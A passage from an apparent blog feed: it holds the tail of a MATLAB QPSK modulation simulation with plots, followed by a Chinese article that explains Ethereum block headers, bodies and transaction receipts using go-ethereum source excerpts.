class="hljs-number">-1</span>),<span class="hljs-string">&#x27;prbs&#x27;</span>);<span class="hljs-comment">% 生成伪随机序列,长度为63</span><br><br>fb = <span class="hljs-number">10</span>; <span class="hljs-comment">% 波特率10kHz ,比特率值=波特率值,每秒能传输的二进制位数</span><br><br>Ns = <span class="hljs-number">64</span>; <span class="hljs-comment">% 采样次数</span><br><br>fs=fb*Ns; <span class="hljs-comment">% 采样频率,每秒从连续信号中提取并组成离散信号的采样个数</span><br><br>fc = fb; <span class="hljs-comment">%载波频率=比特率</span><br><br>dt=<span class="hljs-number">1</span>/fs; <span class="hljs-comment">% 采样时间,又称时域采样间隔</span><br><br>Ts = dt;<br><br>N = Ns*<span class="hljs-built_in">length</span>(xulie); <span class="hljs-comment">% 总采样点个数</span><br><br><br><span class="hljs-comment">%% 生成两路调制信号</span><br><br>I_carrier = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>Q_carrier = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>I = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br>Q = <span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br><br><span class="hljs-comment">%采用绘图比较I、Q比特流</span><br>bit_data=<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,N);<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len<span class="hljs-number">-1</span><br>    bit_data(Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:Ns*<span class="hljs-built_in">i</span>)=xulie(<span class="hljs-built_in">i</span>);<span class="hljs-comment">%在一个比特周期里面有Fs个1和采样点一模一样</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">%对奇数抽样</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len/<span class="hljs-number">2</span><br>    I(<span class="hljs-number">2</span>*Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:<span class="hljs-number">2</span>*Ns*<span class="hljs-built_in">i</span>) = xulie(<span class="hljs-number">2</span>*<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>);<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">%对偶数采样</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:len/<span class="hljs-number">2</span><span class="hljs-number">-1</span><br>    Q(<span class="hljs-number">2</span>*Ns*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)+<span class="hljs-number">1</span>:<span class="hljs-number">2</span>*Ns*<span class="hljs-built_in">i</span>) = xulie(<span class="hljs-number">2</span>*<span class="hljs-built_in">i</span>);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span>=<span class="hljs-number">1</span>:N<br>    I_carrier(<span class="hljs-built_in">i</span>) = <span class="hljs-built_in">cos</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs));<br>    Q_carrier(<span class="hljs-built_in">i</span>) = -<span class="hljs-built_in">sin</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs));<br><span class="hljs-keyword">end</span><br><span class="hljs-comment">%补充采样（最后一个采样点）</span><br>I_carrier = [I_carrier,<span class="hljs-built_in">ones</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)*<span class="hljs-built_in">cos</span>(<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>*fc*(<span class="hljs-built_in">i</span><span class="hljs-number">-1</span>)/(fs))];<br>Q_carrier = [Q_carrier,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)];<br>Q = [Q,<span class="hljs-built_in">zeros</span>(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)];<br><br>T = N*dt*fb; <span class="hljs-comment">% 截断时间</span><br><br><span class="hljs-comment">%绘图</span><br><span class="hljs-built_in">figure</span>();<br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">plot</span>(bit_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Bitstream&#x27;</span>)<span class="hljs-comment">%比特信息</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">plot</span>(I,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;I Bitstream&#x27;</span>)<span class="hljs-comment">%I路信息</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">plot</span>(Q,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Q Bitstream&#x27;</span>)<span class="hljs-comment">%Q路信息</span><br><span class="hljs-comment">%% 调制</span><br><br>I_data = I.*I_carrier;<br>Q_data = Q.*Q_carrier;<br>QPSK_data = (I_data + Q_data)/<span class="hljs-built_in">sqrt</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">figure</span>();<span class="hljs-comment">%产生一个新图</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-built_in">plot</span>(I_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;I signal&#x27;</span>)<span class="hljs-comment">%I路信号</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">plot</span>(Q_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;Q signal&#x27;</span>)<span class="hljs-comment">%Q路信号</span><br>subplot(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)<br><span class="hljs-built_in">plot</span>(QPSK_data,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>]);<span class="hljs-built_in">legend</span>(<span class="hljs-string">&#x27;QPSK signal&#x27;</span>)<span class="hljs-comment">%QPSK信号</span><br><br><span class="hljs-comment">%% 频谱</span><br>Bs =fs/<span class="hljs-number">2</span>; <span class="hljs-comment">% 系统带宽</span><br>QPSK = <span class="hljs-built_in">abs</span>(fftshift(fft(QPSK_data,N)));<br>ff = <span class="hljs-built_in">linspace</span>(-Bs,Bs,N); <span class="hljs-comment">% 频域横坐标</span><br><span class="hljs-built_in">figure</span>()<br><span class="hljs-built_in">plot</span>(ff,QPSK,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>])<br><span class="hljs-comment">%axis([-50,50,0,60]);</span><br>title(<span class="hljs-string">&#x27;QPSK调制信号频谱图&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;f/kHz&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;频谱&#x27;</span>);<br><span class="hljs-comment">%% 功率谱密度</span><br>Bs =fs/<span class="hljs-number">2</span>; <span class="hljs-comment">% 系统带宽</span><br>QPSK = <span class="hljs-number">10</span>*<span class="hljs-built_in">log10</span>(<span class="hljs-built_in">abs</span>(fftshift(fft(QPSK_data,N))).^<span class="hljs-number">2</span>/T);<br>ff = <span class="hljs-built_in">linspace</span>(-Bs,Bs,N); <span class="hljs-comment">% 频域横坐标</span><br><span class="hljs-built_in">figure</span>()<br><span class="hljs-built_in">plot</span>(ff,QPSK,<span class="hljs-string">&#x27;color&#x27;</span>,[<span class="hljs-number">55</span>/<span class="hljs-number">255</span> <span class="hljs-number">108</span>/<span class="hljs-number">255</span> <span class="hljs-number">176</span>/<span class="hljs-number">255</span>])<br>axis([<span class="hljs-number">-50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">0</span>,<span class="hljs-number">60</span>]);<br>title(<span class="hljs-string">&#x27;QPSK调制信号功率谱图&#x27;</span>);<br>xlabel(<span class="hljs-string">&#x27;f/kHz&#x27;</span>);<br>ylabel(<span class="hljs-string">&#x27;功率谱密度/db&#x27;</span>);<br><span class="hljs-comment">%% 绘制星座图</span><br><br>signal = <span class="hljs-built_in">cat</span>(<span class="hljs-number">2</span>, I&#x27;, Q&#x27;);         <span class="hljs-comment">% 将两路串行信号码元合并在一个length(xulie)*2的矩阵中</span><br><br>[a1,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">-1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">-1</span>);       <span class="hljs-comment">% 返回满足条件的矩阵元素对应的坐标</span><br><br>xinzuotu(a1)=<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-built_in">i</span>;<br><br>[a2,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">-1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">1</span>);<br><br>xinzuotu(a2)=<span class="hljs-number">-1</span>+<span class="hljs-number">1</span><span class="hljs-built_in">i</span>;<br><br>[a3,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">-1</span>);<br><br>xinzuotu(a3)=<span class="hljs-number">1</span><span class="hljs-number">-1</span><span class="hljs-built_in">i</span>;<br><br>[a4,~]=<span class="hljs-built_in">find</span>(signal(:,<span class="hljs-number">1</span>)==<span class="hljs-number">1</span>&amp;signal(:,<span class="hljs-number">2</span>)==<span class="hljs-number">1</span>);<br><br>xinzuotu(a4)=<span class="hljs-number">1</span>+<span class="hljs-number">1</span><span class="hljs-built_in">i</span>;<br><br>scatterplot(xinzuotu)  <span class="hljs-comment">% 以散点图的形式画出星座图</span><br><br>axis([<span class="hljs-number">-2</span> <span class="hljs-number">2</span> <span class="hljs-number">-2</span> <span class="hljs-number">2</span>])<br><br>title(<span class="hljs-string">&#x27;理想情况基带发射星座图&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><p>基带时域波形图<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-9.png#clientId=u6d886849-8a59-4&from=paste&height=185&id=u6306bebc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=754&originalType=binary&size=34568&status=done&style=none&taskId=ude058ecc-602d-4822-b0c1-20e41b84afa&width=699" alt="image.png"><br>QPSK 调制信号波形图<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-10.png#clientId=u6d886849-8a59-4&from=paste&height=191&id=u18365c2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=746&originalType=binary&size=128005&status=done&style=none&taskId=u5c2a400b-5220-4dcd-ad80-60844de7555&width=679" alt="image.png"><br>QPSK 调制信号功率谱图<br><img src="https://image.hackerjerry.top/QPSK%E4%BF%A1%E5%8F%B7%E8%B0%83%E5%88%B6-11.png#clientId=u6d886849-8a59-4&from=paste&height=332&id=uc862d20b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=332&originWidth=441&originalType=binary&size=51742&status=done&style=none&taskId=u90871b21-cec3-43ae-961b-35634aecd9e&width=441" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>区块链底层-区块与交易</title>
    <link href="/2021/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93_new/"/>
    <url>/2021/04/24/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="全局结构"><a href="#全局结构" class="headerlink" title="全局结构"></a>全局结构</h1><p>下图是以太坊区块数据结构与关系。<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-1.png#clientId=u9ae9216b-af72-4&from=paste&height=402&id=u321a8f97&margin=%5Bobject%20Object%5D&originHeight=644&originWidth=1228&originalType=url&status=done&style=none&taskId=u9f6b4a08-53f6-466b-bd87-bb0cb52dc50&width=766"><br>区块分为两部分：区块头(Header)和区块体(Body)。区块头信息量非常丰富，不但和上一个单元建立联系还记录了一些交易执行情况信息和矿工工作信息。</p><h1 id="定义代码"><a href="#定义代码" class="headerlink" title="定义代码"></a>定义代码</h1><p>下面是以太坊代码中定义的区块头和区块体结构定义代码，所有核心代码均在 core/types/block.go 文件中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/block.go:70</span><br><span class="hljs-keyword">type</span> Header <span class="hljs-keyword">struct</span> &#123;<br>   ParentHash  common.Hash    <span class="hljs-string">`json:&quot;parentHash&quot;       gencodec:&quot;required&quot;`</span><br>   UncleHash   common.Hash    <span class="hljs-string">`json:&quot;sha3Uncles&quot;       gencodec:&quot;required&quot;`</span><br>   Coinbase    common.Address <span class="hljs-string">`json:&quot;miner&quot;            gencodec:&quot;required&quot;`</span><br>   Root        common.Hash    <span class="hljs-string">`json:&quot;stateRoot&quot;        gencodec:&quot;required&quot;`</span><br>   TxHash      common.Hash    <span class="hljs-string">`json:&quot;transactionsRoot&quot; gencodec:&quot;required&quot;`</span><br>   ReceiptHash common.Hash    <span class="hljs-string">`json:&quot;receiptsRoot&quot;     gencodec:&quot;required&quot;`</span><br>   Bloom       Bloom          <span class="hljs-string">`json:&quot;logsBloom&quot;        gencodec:&quot;required&quot;`</span><br>   Difficulty  *big.Int       <span class="hljs-string">`json:&quot;difficulty&quot;       gencodec:&quot;required&quot;`</span><br>   Number      *big.Int       <span class="hljs-string">`json:&quot;number&quot;           gencodec:&quot;required&quot;`</span><br>   GasLimit    <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;gasLimit&quot;         gencodec:&quot;required&quot;`</span><br>   GasUsed     <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;gasUsed&quot;          gencodec:&quot;required&quot;`</span><br>   Time        <span class="hljs-keyword">uint64</span>         <span class="hljs-string">`json:&quot;timestamp&quot;        gencodec:&quot;required&quot;`</span><br>   Extra       []<span class="hljs-keyword">byte</span>         <span class="hljs-string">`json:&quot;extraData&quot;        gencodec:&quot;required&quot;`</span><br>   MixDigest   common.Hash    <span class="hljs-string">`json:&quot;mixHash&quot;`</span><br>   Nonce       BlockNonce     <span class="hljs-string">`json:&quot;nonce&quot;`</span><br>&#125;<br><span class="hljs-keyword">type</span> Body <span class="hljs-keyword">struct</span> &#123;<br>Transactions []*Transaction<br>Uncles       []*Header<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><h3 id="parentHash"><a href="#parentHash" class="headerlink" title="parentHash"></a>parentHash</h3><p>是一个哈希值，记录此区块直接引用的父区块哈希值。通过此记录，才能完整的将区块有序组织，形成一条区块链。并且可以防止父区块内容被修改，因为数据修改，区块哈希必然发生变化，因此一个区块直接或间接的强化了所有父辈区块，通过加密算法保证历史区块不可能被修改。</p><h3 id="miner"><a href="#miner" class="headerlink" title="miner"></a>miner</h3><p>是一个地址，表示区块是此账户的矿工挖出，挖矿奖励将下发到此账户。</p><h3 id="transactionsRoot"><a href="#transactionsRoot" class="headerlink" title="transactionsRoot"></a>transactionsRoot</h3><p>是一个哈希值，表示该区块中所有交易生成一颗默克尔树根节点哈希值。是一个密码学保证交易集合摘要。通过此 Root 可以直接校验某交易是否包含在此区块中。</p><h3 id="mixHash"><a href="#mixHash" class="headerlink" title="mixHash"></a>mixHash</h3><p>是一个哈希值。用于校验区块是否正确挖出。实际上是区块头数据不包含 nonce 时的一个哈希值。</p><h1 id="区块体"><a href="#区块体" class="headerlink" title="区块体"></a>区块体</h1><p>区块体 Body 中只有两项数据：<a href="https://learnblockchain.cn/books/geth/part1/transaction.html">交易</a>集合和叔辈区块头集合。是交易促使以太坊世界态进行转变。<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-2.png#clientId=u9ae9216b-af72-4&from=paste&height=203&id=u42b0fbbe&margin=%5Bobject%20Object%5D&originHeight=283&originWidth=969&originalType=url&status=done&style=none&taskId=u56a01b4b-366c-4bd6-976c-05606cea4e0&width=693.5"><br>从创世状态开始，每一个区块中的交易执行促使了以太坊世界态的转变。下一个状态是在上一个状态中执行交易或其他操作使得状态由 A 状态转变为 B 状态。<br>而交易则为状态转变的催化酶，<strong>一个区块中的所有交易执行完成后，将使得以太坊进入一个新的状态。</strong>状态转变过程中记录了一些起始变量和结果数据，分别是交易默克尔哈希值<strong>transactionsRoot</strong>、交易回执默克尔哈希值** receiptRoot<strong>、事件布隆值</strong>logsBloom<strong>、新状态的默克尔哈希值</strong>stateRoot**。</p><h1 id="交易回执"><a href="#交易回执" class="headerlink" title="交易回执"></a>交易回执</h1><p>在以太坊中一份交易回执记录了关于此笔交易的处理结果信息：<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-3.png#clientId=u9ae9216b-af72-4&from=paste&height=380&id=u3f9ff1a7&margin=%5Bobject%20Object%5D&originHeight=760&originWidth=652&originalType=url&status=done&style=none&taskId=u8eec5c7d-8f2e-41d5-9917-91e25564eb4&width=326"><br>回执信息分为三部分：共识信息、交易信息、区块信息。下面分别介绍各类信息。<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-4.png#clientId=u9ae9216b-af72-4&from=paste&height=359&id=u9d6c0d41&margin=%5Bobject%20Object%5D&originHeight=718&originWidth=642&originalType=url&status=done&style=none&taskId=u780e7386-1eaa-45c3-a6fc-2cdef063091&width=321"></p><h2 id="交易回执共识信息"><a href="#交易回执共识信息" class="headerlink" title="交易回执共识信息"></a>交易回执共识信息</h2><p>共识意味在在校验区块合法性时，这部分信息也参与校验。这些信息参与校验的原因是确保交易必须在区块中的固定顺序中执行，且记录了交易执行后的状态信息。这样可强化交易顺序。</p><ul><li>Status： 成功与否，1 表示成功，0 表示失败。</li><li>CumulativeGasUsed： 区块中已执行的交易累计消耗的 Gas，包含当前交易。</li><li>Logs: 当前交易执行所产生的智能合约事件列表。</li><li>Bloom：是从 Logs 中提取的事件布隆过滤器，用于快速检测某主题的事件是否存在于 Logs 中。</li></ul><p><strong>如何参与共识校验呢</strong>？<br>实际上<strong>参与校验</strong>的<strong>仅仅是回执哈希</strong>，而<strong>回执哈希</strong>计算<strong>只包含这些信息</strong>。<br>首先，在校验时获取整个区块回执信息的默克尔树的根哈希值。再判断此哈希值是否同区块头定义内容相同。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/block_validator.go:92</span><br>receiptSha := types.DeriveSha(receipts)<br><span class="hljs-keyword">if</span> receiptSha != header.ReceiptHash &#123;<br>   <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;invalid receipt root hash (remote: %x local: %x)&quot;</span>,<br>   header.ReceiptHash, receiptSha)<br>&#125;<br></code></pre></td></tr></table></figure><p>而函数 types.DeriveSha 中<strong>生成根哈希值</strong>，是将列表元素（这里是<strong>交易回执</strong>）的<strong>RLP 编码信息</strong>构成<strong>默克树</strong>，最终获得列表的哈希值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/derive_sha.go:32</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">DeriveSha</span><span class="hljs-params">(list DerivableList)</span> <span class="hljs-title">common</span>.<span class="hljs-title">Hash</span></span> &#123;<br>   keybuf := <span class="hljs-built_in">new</span>(bytes.Buffer)<br>   trie := <span class="hljs-built_in">new</span>(trie.Trie)<br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; list.Len(); i++ &#123;<br>      keybuf.Reset()<br>      rlp.Encode(keybuf, <span class="hljs-keyword">uint</span>(i))<br>      trie.Update(keybuf.Bytes(), list.GetRlp(i))<br>   &#125;<br>   <span class="hljs-keyword">return</span> trie.Hash()<br>&#125;<br><span class="hljs-comment">// core/types/receipt.go:237</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r Receipts)</span> <span class="hljs-title">GetRlp</span><span class="hljs-params">(i <span class="hljs-keyword">int</span>)</span> []<span class="hljs-title">byte</span></span> &#123;<br>   bytes, err := rlp.EncodeToBytes(r[i])<br>   <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-built_in">panic</span>(err)<br>   &#125;<br>   <span class="hljs-keyword">return</span> bytes<br>&#125;<br></code></pre></td></tr></table></figure><p>继续往下看，交易回执实现了 RLP 编码接口。在方法 EncodeRLP 中是构建了一个私有的 receiptRLP。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:119</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *Receipt)</span> <span class="hljs-title">EncodeRLP</span><span class="hljs-params">(w io.Writer)</span> <span class="hljs-title">error</span></span> &#123;<br><span class="hljs-keyword">return</span> rlp.Encode(w,<br>&amp;receiptRLP&#123;r.statusEncoding(), r.CumulativeGasUsed, r.Bloom, r.Logs&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>从代码中可以看出 receiptRLP 仅仅包含上面提到的参与共识校验的内容。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:78</span><br><span class="hljs-keyword">type</span> receiptRLP <span class="hljs-keyword">struct</span> &#123;<br>   PostStateOrStatus []<span class="hljs-keyword">byte</span><br>   CumulativeGasUsed <span class="hljs-keyword">uint64</span><br>   Bloom             Bloom<br>   Logs              []*Log<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="交易回执交易信息"><a href="#交易回执交易信息" class="headerlink" title="交易回执交易信息"></a>交易回执交易信息</h2><p>这部分信息记录的是关于回执所对应的交易信息，有：</p><ul><li>TxHash ： 交易回执所对应的交易哈希。</li><li>ContractAddress： 当这笔交易是部署新合约时，记录新合约的地址。</li><li>GasUsed: 这笔交易执行所消耗的<a href="https://learnblockchain.cn/books/geth/part1/gas.html">Gas 燃料</a>。</li></ul><p>这些信息不参与共识的原因是这三项信息已经在其他地方校验。</p><ul><li>TxHash: 区块有校验交易集的正确性。</li><li>ContractAddress： 如果是新合约，实际上已经提交到以太坊状态 State 中。</li><li>GasUsed： 已属于 CumulativeGasUsed 的一部分。</li></ul><h2 id="交易回执区块信息"><a href="#交易回执区块信息" class="headerlink" title="交易回执区块信息"></a>交易回执区块信息</h2><p>这部分信息完全是<strong>为了方便外部读取交易回执</strong>，不但知道交易执行情况，<strong>还能方便的指定该交易属于哪个区块中第几笔交易</strong>。</p><ul><li>BlockHash: <strong>交易所在区块哈希</strong>。</li><li>BlockNumber: <strong>交易所在区块高度</strong>。</li><li>TransactionIndex：<strong>交易在区块中的序号</strong>。</li></ul><p>这三项信息，主要是<strong>在数据库 Leveldb 中读取交易回执</strong>时，<strong>实时指定</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:315</span><br>receipts := <span class="hljs-built_in">make</span>(types.Receipts, <span class="hljs-built_in">len</span>(storageReceipts))<br>logIndex := <span class="hljs-keyword">uint</span>(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i, receipt := <span class="hljs-keyword">range</span> storageReceipts &#123;<br>   <span class="hljs-comment">//...</span><br>   receipts[i] = (*types.Receipt)(receipt)<br>   receipts[i].BlockHash = hash<br>   receipts[i].BlockNumber = big.NewInt(<span class="hljs-number">0</span>).SetUint64(number)<br>   receipts[i].TransactionIndex = <span class="hljs-keyword">uint</span>(i)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="交易回执存储"><a href="#交易回执存储" class="headerlink" title="交易回执存储"></a>交易回执存储</h2><p><strong>交易回执</strong>作为<strong>交易执行中间产物</strong>，为了方便快速获取某笔交易的执行明细。以太坊中有跟随区块存储时实时存储交易回执。但为了降低存储量，只存储了必要内容。<br>首先，在<strong>存储</strong>时，将交易回执对象转换为<strong>精简内容</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:338</span><br>storageReceipts := <span class="hljs-built_in">make</span>([]*types.ReceiptForStorage, <span class="hljs-built_in">len</span>(receipts))<br><span class="hljs-keyword">for</span> i, receipt := <span class="hljs-keyword">range</span> receipts &#123;<br>   storageReceipts[i] = (*types.ReceiptForStorage)(receipt)<br>&#125;<br></code></pre></td></tr></table></figure><p>精简内容是专门为存储定义的一个结构 ReceiptForStorage。存储时将交易回执集进行 RLP 编码存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/rawdb/accessors_chain.go:342</span><br>bytes, err := rlp.EncodeToBytes(storageReceipts)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   log.Crit(<span class="hljs-string">&quot;Failed to encode block receipts&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> err := db.Put(blockReceiptsKey(number, hash), bytes); err != <span class="hljs-literal">nil</span> &#123;<br>   log.Crit(<span 